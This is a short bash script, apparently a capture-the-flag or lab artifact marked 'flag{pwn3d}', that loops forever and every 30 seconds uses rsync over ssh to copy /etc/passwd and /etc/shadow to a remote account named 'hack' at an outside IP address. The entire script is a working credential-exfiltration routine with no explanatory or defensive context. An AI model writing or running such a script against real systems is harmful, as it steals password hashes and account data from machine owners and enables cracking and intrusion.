#! /bin/bash

while true; do
rsync -av -e ssh /etc/passwd /etc/shadow hack@137.229.25.180:/home/hack/secret
sleep 30
done

# flag{pwn3d}
